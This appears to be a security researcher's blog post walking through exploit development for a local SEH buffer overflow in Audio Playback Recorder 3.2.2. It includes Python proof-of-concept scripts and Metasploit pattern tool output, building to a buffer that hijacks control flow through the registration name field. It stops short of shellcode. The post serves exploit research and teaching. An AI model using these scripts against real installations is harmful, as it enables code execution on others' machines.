---
layout: post
title: Audio Playback Recorder 3.2.2 - Local Buffer Overflow (SEH)
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

#### Audio Playback Recorder 3.2.2 suffers from a Structured Exception Handling Overwrite when a long string is parsed through the parameter “License Name” within the registration in the bootup.

##### Initial PoC:

```terma
import struct

buffer = "A" * 500

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

##### Once the exploit is run, the payload is copied into the clipboard.

##### In order to exploit the application, press "Go".

![](/assets/img/Findings11/1.png)

##### Press on the button "Register".

![](/assets/img/Findings11/2.png)

##### Paste the contents of the payload on the parameter "Name".

![](/assets/img/Findings11/3.png)

###### Response of the SEH Chain.

![](/assets/img/Findings11/4.png)

###### Creating a parameter with msf-pattern_create.

```term
root@whitecr0wz:~# msf-pattern_create -l 500 
...
```

##### This pattern is pasted into the parameter "Name".

![](/assets/img/Findings11/5.png)

##### Response of the SEH Chain II.

![](/assets/img/Findings11/6.png)

##### Obtaining the offset with the use of msf-pattern_offset.

```term
root@whitecr0wz:~# msf-pattern_offset -q 41327041 
[*] Exact match at offset 456
root@whitecr0wz:~# 
```

###### Current PoC:

```term
import struct

buffer = "A" * 456 + "BBBB" + "CCCC"

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

##### Response of the SEH Chain III.

![](/assets/img/Findings11/7.png)

##### Enumerating the modules.

![](/assets/img/Findings11/8.png)

##### Listing the POP-POP-RETN sequences.

![](/assets/img/Findings11/9.png)

##### Current PoC:

```term
mport struct

nseh = struct.pack("<I", 0x06710870)
seh = struct.pack("<I", 0x10023B71)

buffer = "A" * 456 + nseh + seh + "C" * 200

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```

##### Response of the SEH Chain IV.

![](/assets/img/Findings11/10.png)

##### The flow is hijacked.

![](/assets/img/Findings11/11.png)

##### Due to the fact that we have incredibly small buffer space (400 bytes), and we require an alphanumeric shellcode, an egghunter will be required. For more information, see [here](https://whitecr0wz.github.io/posts/Exploiting-SEH-Overwrites-on-Windows-with-the-use-of-Egghunters/).

![](/assets/img/Findings11/11-proof.gif)
